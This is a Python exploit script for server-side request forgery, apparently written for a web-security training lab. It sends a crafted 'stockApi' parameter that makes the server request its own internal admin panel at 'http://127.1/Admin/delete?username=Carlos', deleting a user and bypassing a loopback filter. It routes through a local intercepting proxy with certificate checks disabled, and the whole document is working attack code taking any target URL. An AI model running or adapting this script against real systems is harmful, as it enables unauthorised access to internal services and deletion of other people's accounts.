import requests
import urllib3
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def SSRF_admin(url):
    parameter = '/product/stock'
    payload_parameter = 'http://127.1/Admin/delete?username=Carlos'
    payload = {'stockApi': payload_parameter}
    r = requests.post(url + parameter, data=payload, verify=False, proxies=proxies)
    print('[+] Deleting Carlos...')
    return True

def Check_deleting(url):
    SSRF_admin(url)
    parameter = '/product/stock'
    payload_parameter = 'http://127.1/Admin'
    payload = {'stockApi': payload_parameter}
    r = requests.post(url + parameter, data=payload, verify=False, proxies=proxies)
    if 'User deleted successfully!' in r.text:
        print('[+] Carlos successfully Deleted')
    


def main():
    if len(sys.argv) != 2:
        print("[-] Usage : %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("[+] Looking for Carlos' Life...")
    Check_deleting(url)



if __name__ == "__main__":
    main()